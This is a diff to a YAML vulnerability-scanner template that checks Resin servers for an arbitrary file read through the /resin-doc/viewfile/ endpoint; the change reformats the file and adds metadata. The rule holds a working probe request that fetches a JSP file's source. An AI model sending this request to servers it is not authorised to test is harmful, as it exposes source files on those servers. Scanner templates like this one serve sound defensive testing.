@@ -1,15 +1,19 @@
 id: resin-viewfile-fileread
 
 info:
-    name: resin viewfile fileread
-    author: whynot(https://github.com/notwhy)
-    severity: high
+  name: resin viewfile fileread
+  author: whynot
+  severity: high
+  verified: true
+  description: |-
+    resin viewfile fileread
+  tags: resin,fileread
+  created: 2023/08/13
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /resin-doc/viewfile/?file=index.jsp
-        expression: response.status == 200 && response.body.bcontains(bytes("%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %"))
+  r0:
+    request:
+      method: GET
+      path: /resin-doc/viewfile/?file=index.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes("%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %"))
 expression: r0()
-
